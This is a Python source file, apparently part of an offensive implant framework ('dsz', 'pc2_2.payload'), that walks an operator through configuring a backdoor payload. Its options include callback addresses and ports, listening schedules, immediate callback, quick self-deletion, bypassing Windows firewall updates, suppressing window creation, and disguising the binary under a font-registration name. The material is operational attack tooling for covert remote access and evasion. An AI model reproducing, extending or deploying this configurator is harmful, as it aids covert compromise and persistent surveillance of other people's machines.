
# package pc2_2.payload.config
import dsz
import pc2_2

import re

#--------------------------------------------------------------------------------------
def fixStringForXml(origStr):
	newStr = origStr
	if (len(newStr) > 0):
		newStr = re.sub("&", "&amp;", newStr)
		newStr = re.sub("<", "&lt;", newStr)
		newStr = re.sub(">", "&gt;", newStr)
	return newStr
	
#--------------------------------------------------------------------------------------
def SetCallbackInfo(type, advanced=True):

	configLines = list()
	
	callbackAddr = "127.0.0.1";
	if (type.lower() == "level3"):
		addr = dsz.ui.GetString("Enter the callback address (127.0.0.1 = no callback)")
		while (not pc2_2.IsValidIpAddress(addr)):
			addr = dsz.ui.GetString("Enter the callback address")
		
		callbackAddr = addr;
		configLines.append("  <CallbackAddress>%s</CallbackAddress>\n" % addr)
		
	if (advanced or (callbackAddr != "127.0.0.1")):
		# check if they want to change the callback ports0
		if (dsz.ui.Prompt("Change CALLBACK PORTS?", False)):
			configLines.append("  <CallbackPorts>\n")
			
			numPorts = 0
			while (numPorts < 6):
				
				dstPort = dsz.ui.GetInt("Enter callback DST port (0=no more ports)")
				if (dstPort != 0):
					srcPort = dsz.ui.GetInt("Enter callback SRC port", "0")
				else:
					# no more ports
					break
				
				if ((dstPort < 0) or (dstPort > 65535) or
					(srcPort < 0) or (srcPort > 65535)):
					dsz.ui.Echo("* Invalid port value (must be between 0 and 65535)", dsz.ERROR)
				else:
					configLines.append("    <CallbackPair>\n")
					configLines.append("      <SrcPort>%u</SrcPort>\n" % srcPort)
					configLines.append("      <DstPort>%u</DstPort>\n" % dstPort)
					configLines.append("    </CallbackPair>\n")
					numPorts = numPorts + 1
		
			configLines.append("  </CallbackPorts>\n")
	
	return configLines

#--------------------------------------------------------------------------------------
def SetFlags(os, binType, type, defaultFlags, advanced=True):

	configLines = list()
	configLines.append("  <Flags>\n")
	
	usingUB = False
	for flag in defaultFlags:
		if (len(flag) > 0):
			configLines.append("    <%s/>\n" % flag)
			if (flag == "PCHEAP_CONFIG_LOADED_WITH_UTILITY_BURST"):
				usingUB = True
	
	if (type.lower() == "level3"):
	
		if (dsz.ui.Prompt("Perform IMMEDIATE CALLBACK?", False)):
			configLines.append("    <PCHEAP_CONFIG_FLAG_CALLBACK_NOW/>\n")
		if (binType.lower() == "exe"):
			if (dsz.ui.Prompt("Enable QUICK SELF-DELETION?", False)):
				configLines.append("    <PCHEAP_CONFIG_FLAG_QUICK_DELETE_SELF/>\n")
			
	elif (type.lower() == "level4"):
	
		if (dsz.ui.Prompt("Listen AT ALL TIMES?", False)):
			configLines.append("    <PCHEAP_CONFIG_FLAG_24_HOUR/>\n")
		if (advanced and (not usingUB) and (os == "winnt")):
			if (dsz.ui.Prompt("Configure for install with UTILITYBURST?", False)):
				configLines.append("    <PCHEAP_CONFIG_LOADED_WITH_UTILITY_BURST/>\n")
	
	if (advanced and (os == "winnt")):
		if (not dsz.ui.Prompt("Update the Windows firewall when listening?")):
			configLines.append("    <PCHEAP_CONFIG_FLAG_IGNORE_WIN_FIREWALL/>\n")

	defaultWindowFlag = False
	if (binType.lower() == "sharedlib"):
		defaultWindowFlag = True

	if (advanced and (os == "winnt")):
		if (dsz.ui.Prompt("Disable window creation?", defaultWindowFlag)):
			configLines.append("    <PCHEAP_CONFIG_FLAG_DONT_CREATE_WINDOW/>\n")
	elif (defaultWindowFlag):
		configLines.append("    <PCHEAP_CONFIG_FLAG_DONT_CREATE_WINDOW/>\n")
	
	if (advanced and (os == "winnt") and (type.lower() == "level4")):
		if (dsz.ui.Prompt("Disable shared status memory creation?", False)):
			configLines.append("    <PCHEAP_CONFIG_FLAG_DONT_CREATE_SECTION/>\n")
			
	configLines.append("  </Flags>\n")
	return configLines

#--------------------------------------------------------------------------------------
def SetId(type, advanced=True):

	configLines = list()
	
	id = 0x7FFFFFFFFFFFFFFF
	while (id == 0x7FFFFFFFFFFFFFFF):
		id = dsz.ui.GetInt("Enter the PC ID", "0")
	
	configLines.append("  <Id>0x%x</Id>\n" % id)
	return configLines

#--------------------------------------------------------------------------------------
def SetListenInfo(type, existingConfigLines, advanced=True):

	configLines = list()

	askForListenHours = True
	askForListenPorts = True
	if (type.lower() == "level3"):
	
		if (advanced):
			if (dsz.ui.Prompt("Change the number of LISTEN LOOPS?", False)):
				loops = 0
				while ((loops <= 0) or (loops > 36)):
					loops = dsz.ui.GetInt("Enter the number of listen loops", "6")
					
				configLines.append("  <ListenLoops>%u</ListenLoops>\n" % loops)

			if (dsz.ui.Prompt("Change the LISTEN DURATION per loop?", False)):
				duration = 0
				while ((duration <= 0) or (duration > 3600)):
					duration = dsz.ui.GetInt("Enter the listen duration (in seconds)", "300")

				configLines.append("  <ListenDuration>%u</ListenDuration>\n" % duration)
		else:
			# never ask for listen hours unless you're in advanced mode
			askForListenHours = False
			
		if (not dsz.ui.Prompt("Do you want to LISTEN?", True)):
			# no need to ask for listen hours or ports anymore
			askForListenHours = False
			askForListenPorts = False
			
			configLines.append("  <StartListenHour>0</StartListenHour>\n")
			configLines.append("  <StopListenHour>0</StopListenHour>\n")
				
	elif (type.lower() == "level4"):

		# check for 24-hour before asking about listening hours
		for line in existingConfigLines:
			if (re.search("PCHEAP_CONFIG_FLAG_24_HOUR", line) != None):
				askForListenHours = False
				break
	
	if (askForListenHours):
		if (dsz.ui.Prompt("Change the LISTEN HOURS?", False)):
			
			start = dsz.ui.GetInt("Enter the starting hour (0-24)")
			stop = dsz.ui.GetInt("Enter the ending hour (0-24)")
			
			configLines.append("  <StartListenHour>%u</StartListenHour>\n" % start)
			configLines.append("  <StopListenHour>%u</StopListenHour>\n" % stop)
			
			if (start == stop):
				# start == stop means no listening, no need to ask for listen ports
				askForListenPorts = False
		
	# always check if they want to change the listen ports
	if (askForListenPorts or advanced):
		if (dsz.ui.Prompt("Change LISTEN PORTS?", False)):
			configLines.append("  <ListenPorts>\n")
			
			numPorts = 0
			while (numPorts < 6):
				port = dsz.ui.GetInt("Enter listening port (0=no more ports)")
				if (port == 0):
					# no more ports
					break

				if ((port < 0) or (port > 65535)):
					dsz.ui.Echo("* Invalid port value (must be between 1 and 65535)", dsz.ERROR)
				else:
					configLines.append("    <BindPort>%u</BindPort>\n" % port)
					numPorts = numPorts + 1
		
			configLines.append("  </ListenPorts>\n")
	
	if (advanced):
		if (dsz.ui.Prompt("Change LISTEN BIND ADDRESS", False)):
			bindAddr = dsz.ui.GetString("Enter the listen bind address", "0.0.0.0")
			while (not pc2_2.IsValidIpAddress(bindAddr)):
				bindAddr = dsz.ui.GetString("Enter the listen bind address", "0.0.0.0")
			
			configLines.append("  <ListenBindAddress>%s</ListenBindAddress>\n" % bindAddr)
	
	return configLines

#--------------------------------------------------------------------------------------
def SetMiscInfo(type, driverName="", procName="", infoValue="", advanced=True):

	configLines = list()
	
	if (type.lower() == "level3"):
		if (dsz.ui.Prompt("Change exe name in version information?", False)):
			origName = "fontreg.exe"
			newName = dsz.ui.GetString("Enter the new name", origName)
			while ((len(newName) < 10) or (len(newName) > 11)):
				dsz.ui.Echo("Name length must be between 10 and 11 characters")
				newName = dsz.ui.GetString("Enter the new name", "fontreg.exe")
			configLines.append("  <InternalName>%s</InternalName>\n" % fixStringForXml(newName))
			configLines.append("  <OriginalFilename>%s</OriginalFilename>\n" % fixStringForXml(newName))
			
	if (type.lower() == "level4"):
		if (len(driverName) > 0):
			configLines.append("  <DriverName>%s</DriverName>\n" % fixStringForXml(driverName))
		else:
			if (advanced and dsz.ui.Prompt("Change the TRIGGER DRIVER NAME?", False)):
				name = dsz.ui.GetString("Enter the TRIGGER DRIVER NAME")
				configLines.append("  <DriverName>%s</DriverName>\n" % fixStringForXml(name))

		if (len(procName) > 0):
			configLines.append("  <ProcessName>%s</ProcessName>\n" % fixStringForXml(procName))
		else:
			if (advanced and dsz.ui.Prompt("Change the PROCESS NAME?", False)):
				name = dsz.ui.GetString("Enter the PROCESS NAME")
				configLines.append("  <ProcessName>%s</ProcessName>\n" % fixStringForXml(name))
	
		if (len(infoValue) > 0):
			configLines.append("  <InfoValue>%s</InfoValue>\n" % fixStringForXml(infoValue))
		else:
			if (advanced and dsz.ui.Prompt("Change the INFO VALUE?", False)):
				value = dsz.ui.GetString("Enter the INFO VALUE")
				configLines.append("  <InfoValue>%s</InfoValue>\n" % fixStringForXml(value))
	
	return configLines

#--------------------------------------------------------------------------------------
def SetProxyInfo(commType, advanced=True):

	configLines = list()
	
	if (commType.lower() != "http"):
		# nothing to configure
		return configLines
	
	if (dsz.ui.Prompt("Set the proxy address?", False)):
		while True:
			addr = dsz.ui.GetString("Enter the PROXY ADDRESS")
			port = dsz.ui.GetInt("Enter the PROXY PORT")
			if ((port > 0) and (port < 65535)):
				configLines.append("  <ProxyAddress>%s</ProxyAddress>\n" % addr)
				configLines.append("  <ProxyPort>%u</ProxyPort>\n" % port)
				break
	
	if (dsz.ui.Prompt("Set the proxy login?", False)):
		login = dsz.ui.GetString("Enter the PROXY USERNAME")
		passwd = dsz.ui.GetString("Enter the PROXY PASSWORD")
		configLines.append("  <ProxyUser>%s</ProxyUser>\n" % fixStringForXml(login))
		configLines.append("  <ProxyPassword>%s</ProxyPassword>\n" % fixStringForXml(passwd))

	return configLines

#--------------------------------------------------------------------------------------
def SetProxyConnectionParameters(commType, advanced=True):

	configLines = list()
	
	if (commType.lower() != "http"):
		# nothing to configure
		return configLines
	
	if (dsz.ui.Prompt("Set the proxy connection parameters?", False)):
		while True:
			if (dsz.ui.Prompt("Change the default MAXIMUM DATA SEND SIZE?", False)):
				maxDataPerSend = dsz.ui.GetInt("Enter the MAXIMUM DATA SEND SIZE")
				if ((maxDataPerSend > 0) and (maxDataPerSend < 65535)):
					configLines.append("  <MaxDataPerSend>%u</MaxDataPerSend>\n" % maxDataPerSend)
					break
				else:
					dsz.ui.Echo("* Valid values for MAXIMUM DATA SEND SIZE are 1024 - 65534")
			else:
				break
		

		while True:				
			if (dsz.ui.Prompt("Change the default WAIT TIME AFTER FAILURE?", False)):
				waitTimeAfterFailure = dsz.ui.GetInt("Enter the WAIT TIME AFTER FAILURE (in seconds)")
				if ((waitTimeAfterFailure > 0) and (waitTimeAfterFailure < 65535)):
					configLines.append("  <WaitTimeAfterFailure>%u</WaitTimeAfterFailure>\n" % waitTimeAfterFailure)
					break
				else:
					dsz.ui.Echo("* Valid values for WAIT TIME AFTER FAILURE are 1 - 65534")
			else:
				break
		
			
		while True:
			if (dsz.ui.Prompt("Change the default WAIT TIME BETWEEN SENDS?", False)):
				waitTimeBetweenSends = dsz.ui.GetInt("Enter the WAIT TIME BETWEEN SENDS (in seconds)")
				if ((waitTimeBetweenSends > 0) and (waitTimeBetweenSends < 65535)):
					configLines.append("  <WaitTimeBetweenSends>%u</WaitTimeBetweenSends>\n" % waitTimeBetweenSends)
					break
				else:
					dsz.ui.Echo("* Valid values for WAIT TIME BETWEEN SENDS are 1 - 65534")
			else:
				break
		

		while True:
			if (dsz.ui.Prompt("Change the default MAXIMUM SEND FAILURES?", False)):
				maxSendFailures = dsz.ui.GetInt("Enter the MAXIMUM SEND FAILURES")
				if ((maxSendFailures > 0) and (maxSendFailures < 65535)):
					configLines.append("  <MaximumSendFailures>%u</MaximumSendFailures>\n" % maxSendFailures)
					break
				else:
					dsz.ui.Echo("* Valid values for MAXIMUM SEND FAILURES are 1 - 65534")
			else:
				break
		
					
#		while True:
#			if (dsz.ui.Prompt("Change the default MAXIMUM DATA NODES?", False)):
#				maxDataNodes = dsz.ui.GetInt("Enter the MAXIMUM DATA NODES")
#				if ((maxDataNodes > 0) and (maxDataNodes < 65535)):
#					configLines.append("  <MaximumDataNodes>%u</MaximumDataNodes>\n" % maxDataNodes)
#					break
#			else:
#				break


	return configLines
